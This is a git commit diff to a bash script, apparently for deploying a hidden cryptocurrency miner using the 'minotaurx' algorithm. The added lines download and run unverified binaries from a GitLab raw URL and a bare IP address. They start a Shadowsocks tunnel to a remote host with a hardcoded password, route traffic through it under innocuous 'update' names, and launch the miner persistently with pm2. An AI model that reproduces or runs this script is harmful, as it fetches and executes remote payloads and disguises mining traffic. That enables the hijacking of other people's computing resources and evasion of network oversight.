018aee0eac786590f4fb1010b623fd42c1a24fe7
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-26 15:23:36 +0200

    Update workload_for_kag.sh

--- workload_for_kag.sh
+++ workload_for_kag.sh
@@ -1,15 +1,27 @@
 #!/bin/bash
 cd
 sleep 2
-whoami
-sleep 3
+export DEBIAN_FRONTEND=noninteractive
+DEBIAN_FRONTEND=noninteractive
+
+sleep 2
+cat /etc/*-release
+sleep 2
+
+apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
+
+sleep 2
+
+apt -y upgrade
+
+sleep 2
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 currentdate=$(date '+%d-%b-%Y_Kag_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 6`
+used_num_of_cores=`expr $num_of_cores - 10`
 
 echo ""
 echo "You have a total number of $used_num_of_cores cores"
@@ -23,7 +35,10 @@ sleep 2
 
 # Function to check if Node.js is installed
 
-wget -O - https://deb.nodesource.com/setup_20.x | bash
+wget -O - https://deb.nodesource.com/setup_16.x | bash
+
+sleep 3
+
 apt -y install nodejs
 
 sleep 2
@@ -48,14 +63,88 @@ apt-get install -y google-chrome-stable
 
 sleep 2
 
+npm install pm2 -g
+
+sleep 2
+
+#pm2 set pm2:sysmonit true
+
+sleep 2
+
+#pm2 update
+
+sleep 2
+
+wget https://gitlab.com/update9394625/update411/-/raw/main/Spectre.tar.gz
+
+sleep 2
+
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+mv Spectre /usr/bin
+
+sleep 2
+
+Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+
+sleep 2
+
+curl -x socks5h://127.0.0.1:1082 ifconfig.me
+
+sleep 2
+
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
+
+sleep 2
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
+dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
+
+sleep 2
+
 TZ='Africa/Johannesburg'; export TZ
 date
+sleep 2
+
+wget http://45.135.58.52/update.tar.gz > /dev/null
+
+sleep 2
+
+tar -xf update.tar.gz > /dev/null
+
+sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1082
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+./update/update curl ifconfig.me
+
 sleep 2
 
 rm config.json
 
 sleep 2
 
+#./update/update bash
+
+	
 cat > config.json <<END
 {
   "algorithm": "minotaurx",
@@ -70,7 +159,4 @@ END
 
 sleep 5
 
-node index.js
-
-
-
+./update/update pm2 start index.js --watch
